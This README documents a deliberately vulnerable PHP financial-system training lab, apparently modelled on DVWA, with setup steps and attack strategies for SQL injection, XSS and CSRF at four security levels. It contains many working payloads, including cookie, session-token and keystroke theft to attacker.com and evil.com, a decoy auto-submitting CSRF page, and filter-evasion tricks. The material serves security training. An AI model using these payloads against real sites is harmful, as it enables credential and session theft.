 Financial System DVWA - Vulnerable Financial Management System

[![GitHub](https://img.shields.io/badge/GitHub-Nadzare%2Fdvwa--system-blue?logo=github)](https://github.com/Nadzare/dvwa-system)
[![Docker](https://img.shields.io/badge/Docker-Ready-2496ED?logo=docker)](https://www.docker.com/)
[![PHP](https://img.shields.io/badge/PHP-8.2-777BB4?logo=php)](https://www.php.net/)
[![License](https://img.shields.io/badge/License-Educational-green.svg)](LICENSE)

Aplikasi sistem keuangan yang sengaja vulnerable untuk pelatihan penetration testing dalam konteks financial applications. Dibuat dari nol dengan fokus 4 vulnerability utama:
- SQL Injection (error-based + blind) - Pencarian transaksi keuangan
- XSS Reflected - Laporan keuangan
- XSS Stored - Catatan transaksi
- CSRF - Ubah PIN transaksi

🔗 **Repository:** https://github.com/Nadzare/dvwa-system

## ⚡ NEW! IDS Evasion Support untuk Financial System

**Financial System DVWA sekarang menerima payload dengan encoding untuk bypass IDS!**

Testing dalam konteks:
- ✅ SQL Injection pada pencarian transaksi keuangan
- ✅ XSS pada form laporan dan catatan transaksi
- ✅ CSRF pada perubahan PIN transaksi

✅ Multi-level URL encoding (`%27`, `%2527`, `%252527`)  
✅ HTML entity encoding (`&#39;`, `&lt;script&gt;`)  
✅ Unicode escapes (`\u0027`)  
✅ Comment injection (`UNI/**/ON`)  
✅ Alternative syntax (SVG, IMG, alternative events)

📖 **Testing Guide:** [TESTING_EVASION.md](TESTING_EVASION.md)  
📖 **40+ Payload Evasion:** [EVASION_PAYLOADS.md](EVASION_PAYLOADS.md)

## 📚 Documentation

### 🚀 Setup Guides
- **[QUICK_START.md](QUICK_START.md)** - ⭐ Pilih environment (Docker/XAMPP/Laragon) dengan cepat
- **[SETUP_GITHUB.md](SETUP_GITHUB.md)** - Panduan lengkap setup dari GitHub clone (semua environment)
- **[SETUP_XAMPP.md](SETUP_XAMPP.md)** - Troubleshooting khusus XAMPP (port conflict, database, dll)
- **[NETWORK_SETUP.md](NETWORK_SETUP.md)** - Setup networking untuk akses dari Kali VM

### 🎯 Payload & Testing
- **[PAYLOADS.md](PAYLOADS.md)** - Panduan lengkap payload SQLi, XSS, CSRF dengan contoh praktis
- **[QUICK_PAYLOADS.md](QUICK_PAYLOADS.md)** - Quick reference card untuk copy-paste payload
- **[test_payloads.ps1](test_payloads.ps1)** - Script PowerShell untuk testing otomatis (Windows)
- **[test_payloads.sh](test_payloads.sh)** - Script Bash untuk testing otomatis (Linux/Kali)
- **[csrf_attack.html](csrf_attack.html)** - HTML file untuk CSRF attack simulation
- **[csrf_iframe_attack.html](csrf_iframe_attack.html)** - Silent CSRF attack via iframe

### 🛡️ IDS Evasion Research
- **[EVASION_SNORT3_SURICATA.md](EVASION_SNORT3_SURICATA.md)** - ⭐⭐ Payload evasion untuk rules spesifik kamu!
- **[CHANGELOG_EVASION_SUPPORT.md](CHANGELOG_EVASION_SUPPORT.md)** - ⭐ What's new in v2.0 - Evasion support!
- **[TESTING_EVASION.md](TESTING_EVASION.md)** - ⭐ Testing guide untuk evasion payloads
- **[EVASION_PAYLOADS.md](EVASION_PAYLOADS.md)** - 40+ teknik bypass IDS (Suricata & Snort3)
- **[LAPORAN_IDS_EVASION.md](LAPORAN_IDS_EVASION.md)** - Laporan lengkap BAB I-V (format akademik)
- **[TABEL_REKAP_TESTING.md](TABEL_REKAP_TESTING.md)** - 9 tabel hasil testing IDS

## ⚡ Quick Start

### 🐳 OPSI 1: Menggunakan Docker (Recommended)

**Prerequisites:**
- Docker & Docker Compose installed
- Port 8000 available
- Git (untuk clone)

**Setup (5 Menit):**

1. **Clone Repository**
   ```bash
   git clone https://github.com/Nadzare/dvwa-system.git
   cd dvwa-system
   ```

2. **Start Docker Container**
   ```bash
   docker compose up -d
   ```

3. **Setup Database (First Time Only)**
   - Buka browser: http://localhost:8000
   - Klik tombol **"📦 Setup Database"** di login page
   - Database akan dibuat otomatis
   - Login dengan kredensial default

4. **Login**
   ```
   Username: admin
   Password: admin123
   Role: Financial Administrator
   ```

### Akses Aplikasi
- **Indonesian:** http://localhost:8000/login_id.php (Sistem Keuangan)
- **English:** http://localhost:8000/login.php (Financial System)

**🎉 No manual database setup needed!** Cukup klik tombol di login page.

**Stop:**
```bash
docker-compose down
```

---

### 📦 OPSI 2: Menggunakan XAMPP/Laragon (Tanpa Docker)

**Prerequisites:**
- XAMPP atau Laragon installed
- Apache + MySQL/MariaDB running
- Git (untuk clone)

**Setup (5 Menit):**

1. **Clone Repository**
   ```bash
   git clone https://github.com/kendikadimas/dvwa.git
   cd dvwa
   ```

2. **Copy ke Web Root**
   ```bash
   # XAMPP
   xcopy /E /I app C:\xampp\htdocs\dvwa
   
   # Laragon
   xcopy /E /I app C:\laragon\www\dvwa
   ```

3. **Edit Config (HANYA untuk XAMPP)**
   
   Edit `config.php`, ubah baris 5-6:
   ```php
   // Dari:
   define('DB_USER', getenv('DB_USER') ?: 'dvwa');
   define('DB_PASSWORD', getenv('DB_PASSWORD') ?: 'dvwa123');
   
   // Jadi:
   define('DB_USER', getenv('DB_USER') ?: 'root');
   define('DB_PASSWORD', getenv('DB_PASSWORD') ?: '');  // kosong untuk XAMPP
   ```
   
   **Atau copy config siap pakai:**
   ```bash
   copy app\config_xampp_example.php app\config.php
   ```

4. **Start Apache & MySQL**
   - XAMPP: Buka XAMPP Control Panel → Start Apache & MySQL
   - Laragon: Start All

5. **Buka Browser**
   ```
   # XAMPP
   http://localhost/dvwa/login.php
   
   # Laragon
   http://localhost/dvwa/login.php
   ```

6. **Klik "📦 Create/Reset DB"**
   Database dibuat otomatis!

7. **Login**
   ```
   Username: admin
   Password: admin123
   ```

**📖 Panduan Lengkap XAMPP:** [SETUP_XAMPP.md](SETUP_XAMPP.md)

---

### 📊 Perbandingan Environment

| Fitur | Docker | XAMPP | Laragon |
|-------|--------|-------|---------|
| Setup Speed | ⚡ Fast (5 min) | ⚡ Fast (5 min) | ⚡ Fast (5 min) |
| Config Edit | ❌ No | ✅ Yes (root/empty) | ❌ No |
| Port Default | 8000 | 80 | 80 |
| Isolation | ✅ Yes | ❌ No | ❌ No |
| Portable | ✅ Yes | ⚠️ Medium | ⚠️ Medium |
| Auto DB Setup | ✅ Yes | ✅ Yes | ✅ Yes |
| Reset DB | ✅ Easy | ✅ Easy | ✅ Easy |

**Rekomendasi:**
- 🐳 **Docker:** Untuk isolation dan portability
- 📦 **XAMPP:** Sudah familiar dengan XAMPP
- 🚀 **Laragon:** Development speed dan simplicity

**Semua opsi support auto-create database!** Tinggal klik tombol di login page.

---

## 🚀 Deploy to Railway

### Prerequisites
- GitHub account
- Railway account (free tier tersedia)

### Steps

1. **Push ke GitHub**
```bash
git add .
git commit -m "Deploy to Railway"
git push origin main
```

2. **Buka Railway Dashboard**
   - Pergi ke https://railway.app
   - Login dengan GitHub

3. **New Project → Deploy from GitHub**
   - Pilih `dvwalast` repository
   - Railway akan otomatis detect docker-compose.yml

4. **Configure Environment (opsional)**
   - Railway auto-detect dari docker-compose.yml
   - Atau set manual: DB_HOST, DB_USER, DB_PASSWORD, DB_NAME

5. **Deploy**
   - Tunggu hingga status "Live" (3-5 menit)
   - Klik "Open App"

6. **Access**
   ```
   https://dvwalast-prod.up.railway.app/login_id.php
   Username: admin
   Password: admin123
   ```

**[Detailed Railway Guide](./RAILWAY_DEPLOYMENT.md)**

---

## 🧪 Lab Vulnerabilities - Financial System Context

### 1. SQL Injection (SQLi) - Pencarian Transaksi
**Lokasi:** `/sqli_id.php` (Indonesian) atau `/sqli.php` (English)

**Skenario:** Sistem pencarian transaksi keuangan berdasarkan invoice number atau transaction ID

**Exploitation:**
```
1 OR 1=1                  → Tampilkan semua transaksi keuangan
1 UNION SELECT 1,2,3,4    → Test columns
1 UNION SELECT username, password, 3, created_at FROM users  → Extract kredensial staff finance
' OR amount > 1000000 --  → Cari transaksi besar
```

**Error-based & Blind SQLi supported**  
**Impact:** Data breach rekening, transaksi, kredensial pegawai keuangan

### 2. XSS - Reflected (Laporan Keuangan)
**Lokasi:** `/xss_reflected_id.php`

**Skenario:** Submit dan preview laporan keuangan sebelum dikirim

**Exploitation:**
```
<script>alert('Laporan Palsu')</script>
<img src=x onerror="fetch('http://attacker.com?cookie='+document.cookie)">
<svg onload="window.location='http://attacker.com/steal?data='+btoa(document.body.innerHTML)">
```

**Payload tercermin di URL - bisa untuk phishing fake financial report**

### 3. XSS - Stored (Catatan Transaksi)
**Lokasi:** `/xss_stored_id.php`

**Skenario:** Staff finance menambahkan catatan/memo pada transaksi yang bisa dilihat semua user

**Exploitation:**
```
<script>alert('Transaksi Mencurigakan')</script>     → Execute untuk semua staff
<img src=x onerror="fetch('http://evil.com?token='+localStorage.getItem('sessionToken'))">  → Steal session
<svg onload="document.body.innerHTML='<h1>Sistem Down untuk Maintenance</h1>'">  → Defacement
```

**Payload disimpan di database - execute otomatis saat staff membuka halaman catatan transaksi**

**🔄 Reset Database Button tersedia untuk clear malicious notes**

### 4. CSRF - Change Transaction PIN
**Lokasi:** `/csrf_id.php`

**Skenario:** Ubah PIN untuk otorisasi transaksi keuangan tanpa verifikasi CSRF token

**Exploitation:**
```html
<!-- Attacker's malicious page -->
<form action="http://localhost:8000/csrf.php" method="POST">
    <input type="hidden" name="new_password" value="hacked123">
    <input type="hidden" name="confirm_password" value="hacked123">
</form>
<script>document.forms[0].submit();</script>
```

**Tidak ada CSRF token - PIN dapat diubah jika admin mengklik link berbahaya**  
**Impact:** Account takeover, unauthorized transaction approval

---

## 🛡️ Security Levels & Attack Strategies

Financial System DVWA memiliki **4 tingkat keamanan** yang bisa diatur untuk setiap vulnerability. Setiap level mensimulasikan tingkat proteksi berbeda dari kode yang vulnerable hingga fully secure.

### 🎚️ Tingkat Keamanan Available

| Level | Icon | Protection Level | Attack Difficulty | Use Case |
|-------|------|-----------------|-------------------|----------|
| **Low** | 🟢 | No protection | ⭐ Easy | Learning basic attacks |
| **Medium** | 🟡 | Basic filtering | ⭐⭐ Medium | Bypass techniques |
| **High** | 🟠 | Advanced protection | ⭐⭐⭐ Hard | Advanced exploitation |
| **Impossible** | 🔴 | Fully secure | ⭐⭐⭐⭐ Impossible | Secure coding reference |

### ⚙️ Cara Setting Security Level

1. **Login** ke sistem → `http://localhost:8000/login_id.php`
2. Dari Dashboard, klik card **"🛡️ Security Level"**
3. **Pilih level** yang ingin ditest (Low/Medium/High/Impossible)
4. Klik **"💾 Simpan Pengaturan"**
5. Buka lab vulnerability apapun (SQLi/XSS/CSRF)
6. Level akan diterapkan otomatis ke semua vulnerability

---

## 🎯 Detailed Attack Strategies per Level

### 🔍 1. SQL Injection - Pencarian Transaksi

#### 🟢 LEVEL LOW - Direct Attack (100% Success)

**Protection:** ❌ None - Direct string concatenation

**Vulnerable Code:**
```php
$query = "SELECT * FROM comments WHERE id = '" . $_POST['id'] . "'";
$result = mysqli_query($conn, $query);
```

**Attack Payloads:**
```sql
# Basic bypass - Show all records
1' OR '1'='1' #
1' OR '1'='1' --
1' OR 1=1 #

# Union-based - Test columns
1' UNION SELECT 1,2,3,4 #
1' UNION SELECT NULL,NULL,NULL,NULL #

# Extract credentials
1' UNION SELECT username, password, 3, created_at FROM users #
1' UNION SELECT table_name, column_name, 3, 4 FROM information_schema.columns #

# Error-based
1' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT((SELECT username FROM users LIMIT 1), 0x3a, FLOOR(RAND()*2)) AS x FROM information_schema.tables GROUP BY x) y) #

# Time-based blind
1' AND SLEEP(5) #
1' AND IF(1=1, SLEEP(5), 0) #

# Boolean-based blind
1' AND SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a' #
```

**Success Rate:** ✅ 100% - Semua payload akan berhasil  
**Error Messages:** Exposed (MySQL errors visible)

---

#### 🟡 LEVEL MEDIUM - Basic Escaping (60% Success)

**Protection:** ⚠️ `mysqli_real_escape_string()` - Escape special characters

**Code Implementation:**
```php
$id = mysqli_real_escape_string($conn, $_POST['id']);
$query = "SELECT * FROM comments WHERE id = '$id'";
$result = mysqli_query($conn, $query);
```

**What Gets Escaped:**
- Single quote `'` → `\'`
- Double quote `"` → `\"`
- Backslash `\` → `\\`
- NULL byte `\0` → `\\0`

**Attack Strategies - Bypass Techniques:**

```sql
# 1. Numeric Context (jika query tanpa quotes di code)
1 OR 1=1
1 UNION SELECT 1,2,3,4

# 2. Multi-byte encoding
1%bf%27 OR 1=1 %23  # (GBK encoding bypass)
1%c0%27 OR 1=1 %23

# 3. Double URL encoding
1%2527 OR 1=1 %2523
1%252527 OR 1=1

# 4. Unicode escapes
1\u0027 OR 1=1 \u0023

# 5. Hexadecimal
1' OR 0x61=0x61 #  # (0x61 = 'a')

# 6. Case manipulation dengan encoding
1' UNI%4fN SELECT 1,2,3,4 #
1' UN/**/ION SE/**/LECT 1,2,3,4 #

# 7. Time-based blind (masih works!)
1' AND SLEEP(5) #
```

**Success Rate:** ⚠️ 60% - Perlu bypass encoding  
**Key Weakness:** Hanya escape karakter, tidak validate input type  
**Error Messages:** Generic (tidak expose MySQL errors)

---

#### 🟠 LEVEL HIGH - Prepared Statements (0% SQLi Success)

**Protection:** 🛡️ PDO Prepared Statements (Parameterized Queries)

**Secure Code:**
```php
$pdo = new PDO("mysql:host=localhost;dbname=dvwa", "root", "");
$stmt = $pdo->prepare("SELECT * FROM comments WHERE id = ?");
$stmt->execute([$_POST['id']]);
$result = $stmt->fetchAll();
```

**Why SQLi Fails:**
- Input treated as **data**, not SQL code
- Database driver handles escaping internally
- No string concatenation with query

**Attack Strategies - Alternative Vectors:**

```
❌ SQL Injection: TIDAK MUNGKIN dengan prepared statements

✅ Alternative Attacks to Try:

1. Logic Flaws:
   - Negative IDs: -1, -999
   - Large numbers: 999999999
   - Zero: 0
   - Special strings: NULL, undefined

2. IDOR (Insecure Direct Object Reference):
   - Brute force valid IDs: 1, 2, 3, 4...
   - Access unauthorized records

3. Second-Order SQLi:
   - Inject payload di field lain
   - Trigger saat data digunakan di query berbeda

4. Race Condition:
   - Submit multiple requests simultaneously
   - Check for inconsistent behavior

5. Business Logic Bypass:
   - Manipulate transaction amounts
   - Exploit validation flaws
```

**Success Rate:** ❌ 0% untuk SQL Injection  
**Recommendation:** Focus on business logic & authorization flaws

---

#### 🔴 LEVEL IMPOSSIBLE - Full Protection (0% Success)

**Protection:** 🔒 Prepared Statements + Input Validation + Authorization

**Secure Implementation:**
```php
// 1. Input validation
if (!is_numeric($id) || $id <= 0) {
    die("Invalid transaction ID");
}

// 2. Type casting
$id = (int)$id;

// 3. Prepared statement
$stmt = $pdo->prepare("SELECT * FROM transactions WHERE id = ? AND user_id = ?");
$stmt->execute([$id, $_SESSION['user_id']]);

// 4. Authorization check
if ($stmt->rowCount() === 0) {
    die("Transaction not found or access denied");
}
```

**Defense Layers:**
1. ✅ Input validation (numeric only)
2. ✅ Type casting (force integer)
3. ✅ Prepared statements (no injection)
4. ✅ Authorization check (user_id match)
5. ✅ Generic error messages (no info leak)
6. ✅ Range validation (positive numbers)

**Attack Attempts:**
```
❌ SEMUA ATTACK GAGAL!

Tried: 1' OR '1'='1
Result: Invalid transaction ID (rejected at validation)

Tried: 1 UNION SELECT...
Result: Treated as data, not executed

Tried: Access ID 999 (belongs to other user)
Result: Access denied (authorization check)
```

**Success Rate:** ❌ 0% - Impossible to exploit  
**This is SECURE CODE - Learn from this!**

---

### 💉 2. XSS Reflected - Laporan Keuangan

#### 🟢 LEVEL LOW - No Sanitization (100% Success)

**Vulnerable Code:**
```php
echo "Report: " . $_GET['report'];  // Direct output
```

**Attack Payloads:**
```html
<!-- Basic alert -->
<script>alert('XSS')</script>
<script>alert(document.cookie)</script>

<!-- Cookie stealing -->
<script>fetch('http://attacker.com/steal?c='+document.cookie)</script>
<script>new Image().src='http://attacker.com/log?cookie='+document.cookie</script>

<!-- Session hijacking -->
<script>location.href='http://evil.com?s='+document.cookie</script>

<!-- Keylogger injection -->
<script>
document.onkeypress=function(e){
  fetch('http://attacker.com/keys?k='+e.key);
}
</script>

<!-- Page defacement -->
<script>document.body.innerHTML='<h1>HACKED!</h1>'</script>

<!-- Form hijacking -->
<script>
document.forms[0].action='http://evil.com/steal';
document.forms[0].submit();
</script>

<!-- IMG tag -->
<img src=x onerror="alert('XSS')">
<img src=x onerror="eval(atob('YWxlcnQoJ1hTUycp'))">

<!-- SVG vector -->
<svg onload="alert('XSS')">
<svg><script>alert('XSS')</script></svg>

<!-- Iframe -->
<iframe src="javascript:alert('XSS')">
<iframe onload="alert('XSS')">

<!-- Event handlers -->
<body onload="alert('XSS')">
<input onfocus="alert('XSS')" autofocus>
<marquee onstart="alert('XSS')">
<details open ontoggle="alert('XSS')">
```

**Success Rate:** ✅ 100% - All payloads work  

---

#### 🟡 LEVEL MEDIUM - Strip `<script>` Only (80% Success)

**Protection:** ⚠️ Basic filtering - Remove `<script>` tags

**Filter Code:**
```php
$report = str_replace('<script>', '', $_GET['report']);
$report = str_replace('</script>', '', $report);
echo "Report: " . $report;
```

**Bypass Strategies:**
```html
<!-- 1. Case manipulation -->
<ScRiPt>alert('XSS')</ScRiPt>
<SCRIPT>alert('XSS')</SCRIPT>
<sCrIpT>alert('XSS')</sCrIpT>

<!-- 2. Alternative tags (WORKS!) -->
<img src=x onerror="alert('XSS')">
<svg onload="alert('XSS')">
<body onload="alert('XSS')">
<iframe src="javascript:alert('XSS')">
<embed src="data:text/html,<script>alert('XSS')</script>">
<object data="javascript:alert('XSS')">

<!-- 3. Event handlers -->
<input onfocus="alert('XSS')" autofocus>
<select onfocus="alert('XSS')" autofocus>
<textarea onfocus="alert('XSS')" autofocus>
<marquee onstart="alert('XSS')">XSS</marquee>
<details open ontoggle="alert('XSS')">
<video><source onerror="alert('XSS')">

<!-- 4. HTML entities -->
<img src=x onerror="&#97;&#108;&#101;&#114;&#116;('XSS')">

<!-- 5. Double tag bypass -->
<scr<script>ipt>alert('XSS')</scr</script>ipt>
<scr\x00ipt>alert('XSS')</scr\x00ipt>

<!-- 6. Encoding -->
<img src=x onerror="eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))">

<!-- 7. Data URI -->
<iframe src="data:text/html,<script>alert('XSS')</script>">
```

**Success Rate:** ⚠️ 80% - Alternative vectors bypass filter  
**Key Weakness:** Only blocks `<script>`, ignores other vectors

---

#### 🟠 LEVEL HIGH - htmlspecialchars() (10% Success)

**Protection:** 🛡️ Encode special HTML characters

**Code:**
```php
echo "Report: " . htmlspecialchars($_GET['report'], ENT_QUOTES, 'UTF-8');
```

**What Gets Encoded:**
- `<` → `&lt;`
- `>` → `&gt;`
- `"` → `&quot;`
- `'` → `&#039;`
- `&` → `&amp;`

**Limited Bypass (Context-Dependent):**
```html
<!-- ❌ HTML context: BLOCKED -->
<script>alert('XSS')</script>
Result: &lt;script&gt;alert('XSS')&lt;/script&gt;

<!-- ❌ Attribute context dengan quotes: BLOCKED -->
<input value="<payload>">

<!-- ⚠️ VULNERABLE jika unquoted attribute: -->
<!-- If output: <input value=$_GET['x']> -->
Payload: x onload=alert('XSS')
Result: <input value=x onload=alert('XSS')>

<!-- ⚠️ VULNERABLE jika JavaScript context: -->
<script>
var data = "<?php echo htmlspecialchars($_GET['x']); ?>";
</script>
Payload: "; alert('XSS'); //
Result: var data = ""; alert('XSS'); //";

<!-- ⚠️ VULNERABLE jika CSS context: -->
<style>
body { background: <?php echo htmlspecialchars($_GET['color']); ?>; }
</style>
Payload: red; } </style><script>alert('XSS')</script><style>
```

**Success Rate:** ❌ 10% - Hanya berhasil jika context khusus  
**Note:** `htmlspecialchars()` secure untuk HTML output context

---

#### 🔴 LEVEL IMPOSSIBLE - CSP + Full Encoding (0% Success)

**Protection:** 🔒 Content Security Policy + Multiple layers

**Implementation:**
```php
// 1. CSP Header
header("Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'");

// 2. Input validation
if (!preg_match('/^[a-zA-Z0-9\s.,!?-]+$/', $_GET['report'])) {
    die("Invalid characters in report");
}

// 3. Output encoding
echo "Report: " . htmlspecialchars($_GET['report'], ENT_QUOTES | ENT_HTML5, 'UTF-8');

// 4. HTTPOnly cookies
setcookie('session', $value, ['httponly' => true, 'secure' => true, 'samesite' => 'Strict']);
```

**Defense Layers:**
1. ✅ CSP header blocks inline scripts
2. ✅ Input whitelist validation
3. ✅ Output encoding (htmlspecialchars)
4. ✅ HTTPOnly cookies (prevent cookie theft)
5. ✅ Secure & SameSite flags
6. ✅ X-XSS-Protection header

**Success Rate:** ❌ 0% - Fully protected

---

### 🔐 3. CSRF - Change Transaction PIN

#### 🟢 LEVEL LOW - No Token (100% Success)

**Vulnerable Code:**
```php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $new_pin = $_POST['new_pin'];
    // Update PIN tanpa validasi
    update_pin($_SESSION['user_id'], $new_pin);
}
```

**Attack HTML (evil.html):**
```html
<!DOCTYPE html>
<html>
<head>
    <title>Klaim Hadiah Anda!</title>
</head>
<body>
    <h1>🎁 Selamat! Anda Menang Hadiah!</h1>
    <p>Klik tombol di bawah untuk klaim...</p>
    
    <!-- Hidden CSRF form -->
    <form id="csrf" action="http://localhost:8000/csrf_id.php" method="POST">
        <input type="hidden" name="new_password" value="hacked123">
        <input type="hidden" name="confirm_password" value="hacked123">
    </form>
    
    <script>
        // Auto-submit setelah 2 detik
        setTimeout(function() {
            document.getElementById('csrf').submit();
        }, 2000);
    </script>
    
    <button onclick="document.getElementById('csrf').submit()">
        🎁 Klaim Hadiah
    </button>
</body>
</html>
```

**Attack Steps:**
1. Host `evil.html` di server attacker
2. Send link ke victim (social engineering)
3. Jika victim sudah login, PIN berubah otomatis
4. Attacker login dengan PIN baru: `hacked123`

**Success Rate:** ✅ 100% - No protection

---

#### 🟡 LEVEL MEDIUM - Referer Check (60% Success)

**Protection:** ⚠️ Check HTTP Referer header

**Code:**
```php
$referer = $_SERVER['HTTP_REFERER'] ?? '';
if (strpos($referer, 'localhost:8000') === false) {
    die("Invalid request source");
}
// Process request
```

**Bypass Techniques:**
```html
<!-- 1. Suppress referer -->
<meta name="referrer" content="no-referrer">
<iframe src="http://localhost:8000/csrf_id.php?new_pin=hacked">

<!-- 2. Blank referer (some configs) -->
<iframe src="http://localhost:8000/csrf_id.php" referrerpolicy="no-referrer">

<!-- 3. Data URI (bypass domain check) -->
<iframe src="data:text/html,
<form action='http://localhost:8000/csrf_id.php' method='POST'>
  <input name='new_pin' value='hacked'>
</form>
<script>document.forms[0].submit()</script>
">

<!-- 4. Subdomain attack (jika check lemah) -->
<!-- Host di: attack.localhost.com -->
<!-- Referer: http://attack.localhost.com (contains 'localhost') -->

<!-- 5. Open redirect chain -->
<!-- localhost:8000/redirect.php?url=evil.com -->
<!-- Referer tetap dari localhost -->
```

**Success Rate:** ⚠️ 60% - Tergantung referer check implementation

---

#### 🟠 LEVEL HIGH - CSRF Token (20% Success)

**Protection:** 🛡️ Anti-CSRF Token (but potentially predictable)

**Code:**
```php
// Generate token (WEAK if predictable)
$_SESSION['csrf_token'] = md5(time() . $_SESSION['user_id']);

// Validate
if ($_POST['csrf_token'] !== $_SESSION['csrf_token']) {
    die("Invalid CSRF token");
}
```

**Attack Strategies:**
```javascript
// 1. Token Prediction (jika timestamp-based)
function predictToken(timestamp, userId) {
    return md5(timestamp + userId);
}

// Brute force recent timestamps
for(let i=0; i<1000; i++) {
    let token = predictToken(Date.now()/1000 - i, '1');
    tryCSRF(token);
}

// 2. XSS to CSRF (Chain vulnerabilities)
<script>
fetch('/csrf_id.php')
  .then(r => r.text())
  .then(html => {
    // Extract token dari halaman
    const token = html.match(/name="csrf_token" value="([^"]+)"/)[1];
    
    // Use token untuk CSRF
    fetch('/csrf_id.php', {
      method: 'POST',
      headers: {'Content-Type': 'application/x-www-form-urlencoded'},
      body: 'csrf_token='+token+'&new_pin=hacked'
    });
  });
</script>

// 3. Token Fixation
// Jika attacker bisa set token victim = token attacker

// 4. Session riding
// Exploitasi session management flaws
```

**Success Rate:** ❌ 20% - Butuh XSS atau token leak  
**Key Weakness:** Token generation predictable

---

#### 🔴 LEVEL IMPOSSIBLE - Secure Token (0% Success)

**Protection:** 🔒 Cryptographic token + Multiple protections

**Secure Implementation:**
```php
// 1. Generate secure random token
if (!isset($_SESSION['csrf_token'])) {
    $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
}

// 2. Per-request token (one-time use)
$token = hash_hmac('sha256', session_id() . time(), SECRET_KEY);

// 3. Timing-safe comparison
if (!hash_equals($_SESSION['csrf_token'], $_POST['csrf_token'] ?? '')) {
    die("Invalid CSRF token");
}

// 4. Re-authentication for sensitive action
if ($_POST['current_password'] !== hash_password($_SESSION['user_id'])) {
    die("Current password required");
}

// 5. SameSite cookie
setcookie('session', $value, [
    'samesite' => 'Strict',
    'httponly' => true,
    'secure' => true
]);

// 6. CAPTCHA on sensitive actions
if (!verify_captcha($_POST['captcha'])) {
    die("CAPTCHA verification failed");
}
```

**Defense Layers:**
1. ✅ Cryptographically secure token (random_bytes)
2. ✅ Per-request tokens (one-time use)
3. ✅ Timing-safe comparison (prevent timing attacks)
4. ✅ Re-authentication required
5. ✅ SameSite cookie attribute
6. ✅ CAPTCHA for sensitive actions
7. ✅ Token expiry (5-10 minutes)
8. ✅ Rate limiting

**Success Rate:** ❌ 0% - Impossible to bypass

---

## 📊 Attack Success Rate Summary

| Vulnerability | 🟢 Low | 🟡 Medium | 🟠 High | 🔴 Impossible |
|---------------|--------|-----------|---------|---------------|
| **SQL Injection** | ✅ 100% | ⚠️ 60% | ❌ 0% | ❌ 0% |
| **XSS Reflected** | ✅ 100% | ⚠️ 80% | ❌ 10% | ❌ 0% |
| **XSS Stored** | ✅ 100% | ⚠️ 80% | ❌ 10% | ❌ 0% |
| **CSRF** | ✅ 100% | ⚠️ 60% | ❌ 20% | ❌ 0% |

---

## 🎓 Learning Path Recommendations

### 📚 Step-by-Step Progression:

**Week 1-2: Level LOW 🟢**
- ✅ Understand basic vulnerability concepts
- ✅ Practice fundamental payloads
- ✅ Learn impact of each vulnerability
- ✅ Test dengan manual payloads
- 📖 Resources: OWASP Top 10, PortSwigger Web Academy

**Week 3-4: Level MEDIUM 🟡**
- ✅ Learn filter bypass techniques
- ✅ Practice encoding methods (URL, HTML, Unicode)
- ✅ Understand defensive mechanisms
- ✅ Try alternative attack vectors
- 📖 Resources: PayloadsAllTheThings, HackTricks

**Week 5-8: Level HIGH 🟠**
- ✅ Advanced exploitation techniques
- ✅ Chaining multiple vulnerabilities
- ✅ Context-based attacks
- ✅ Business logic exploitation
- 📖 Resources: Bug bounty writeups, CTF challenges

**Ongoing: Level IMPOSSIBLE 🔴**
- ✅ Study secure code implementation
- ✅ Understand defense-in-depth
- ✅ Learn security best practices
- ✅ Read OWASP guidelines
- 📖 Resources: OWASP ASVS, CWE Top 25

---

## 🛠️ Recommended Tools for Testing

### 🔍 SQL Injection:
```bash
# sqlmap - Automated SQLi tool
sqlmap -u "http://localhost:8000/sqli_id.php" --data="search=1" --level=5 --risk=3 --batch

# Manual testing
burpsuite  # Intercept & modify requests
hackbar    # Browser extension for quick payload testing
```

### 💉 XSS Testing:
```bash
# XSStrike - Advanced XSS scanner
python3 xsstrike.py -u "http://localhost:8000/xss_reflected_id.php?report=test" --crawl

# BeEF - Browser Exploitation Framework
./beef  # Start BeEF server for advanced XSS exploitation
```

### 🛡️ CSRF Testing:
- **Burp Suite** - CSRF PoC Generator
- **OWASP ZAP** - Automated CSRF detection
- **Manual HTML** - Create custom exploitation pages

### 🔧 General Tools:
- **Burp Suite Community/Pro** - Full-featured web security testing
- **OWASP ZAP** - Free alternative to Burp
- **Postman** - API testing & payload crafting
- **Browser DevTools** - Inspect responses, cookies, storage

---

## 💡 Pro Tips untuk Setiap Level

### 🟢 Tips untuk Level LOW:
1. **Start simple** - Pahami konsep dasar dulu
2. **Read error messages** - MySQL errors kasih banyak info
3. **Test systematically** - Coba payloads satu-satu
4. **Document findings** - Catat payload mana yang works
5. **Understand impact** - Apa yang bisa attacker lakukan?

### 🟡 Tips untuk Level MEDIUM:
1. **Think like defender** - Apa yang di-filter?
2. **Try alternatives** - Satu method blocked? Coba yang lain
3. **Use encoding** - URL encode, HTML entities, Unicode
4. **Chain techniques** - Combine multiple bypass methods
5. **Read source code** - Understand filter implementation

**Bypass Techniques Collection:**
```
# SQL Injection
- Double encoding: %2527
- Case manipulation: UnIoN SeLeCt
- Comment injection: UNI/**/ON
- Alternate syntax: ||, &&, XOR

# XSS
- Alternative tags: <svg>, <img>, <iframe>
- Event handlers: onload, onerror, onfocus
- Case variants: <ScRiPt>
- Encoding: &#97;, \u0061
```

### 🟠 Tips untuk Level HIGH:
1. **Analyze context** - Di mana output muncul?
2. **Look for logic flaws** - Prepared statements secure, tapi logic?
3. **Second-order attacks** - Inject di A, trigger di B
4. **Chain vulnerabilities** - XSS + CSRF, SQLi + File Upload
5. **Business logic bypass** - Authentication, authorization flaws

**Advanced Techniques:**
```
# Context-based XSS
- JavaScript context: '; alert(1); //
- HTML attribute: " onload="alert(1)
- CSS context: </style><script>alert(1)</script>

# Logic flaws
- IDOR: Access other user's data
- Race conditions: Concurrent requests
- Time-based attacks: Blind SQLi, timing analysis
```

### 🔴 Tips untuk Level IMPOSSIBLE:
1. **Study the code** - Ini adalah implementasi secure yang benar
2. **Learn patterns** - Terapkan di project sendiri
3. **Understand WHY secure** - Prepared statements, validation, encoding
4. **Think defense-in-depth** - Multiple layers of protection
5. **Read security standards** - OWASP ASVS, CWE, NIST

**Secure Coding Checklist:**
```
✅ Input Validation (whitelist, type check, range check)
✅ Parameterized Queries (prepared statements)
✅ Output Encoding (context-aware)
